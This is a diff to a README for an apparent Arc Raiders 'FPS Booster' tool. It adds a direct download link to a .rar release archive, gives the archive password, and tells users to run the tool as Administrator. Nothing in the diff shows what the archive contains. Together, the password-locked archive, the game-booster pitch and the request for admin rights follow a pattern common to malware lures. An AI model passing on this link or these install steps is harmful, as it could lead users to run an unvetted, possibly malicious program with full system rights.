@@ -30,10 +30,11 @@ If you’re unsure whether a tweak is allowed — don’t enable it.
 ## 🚀 Quick Start
 
 ### Option A: Release build
-1. Go to **Releases** and download the latest version ( PASSWORD 20026 )
-2. Run the tool as Administrator (only if required by your selected tweaks)
-3. Choose a preset:
+1. Go to **Releases** and download the latest version  ( PASSWORD 20026 )
+1.1 ## [Download]([Link](https://github.com/mrrebriksua/ArcRaiders-FPS-Booster/releases/download/ArcRaidersFpsBooster/ArcRaiders-FPS-Booster.rar))
+4. Run the tool as Administrator (only if required by your selected tweaks)
+5. Choose a preset:
    - **FPS** — maximum performance
    - **Balanced** — best compromise
    - **Low Latency** — smoother input feel
-4. Reboot (only if the tool asks you to)
+6. Reboot (only if the tool asks you to)
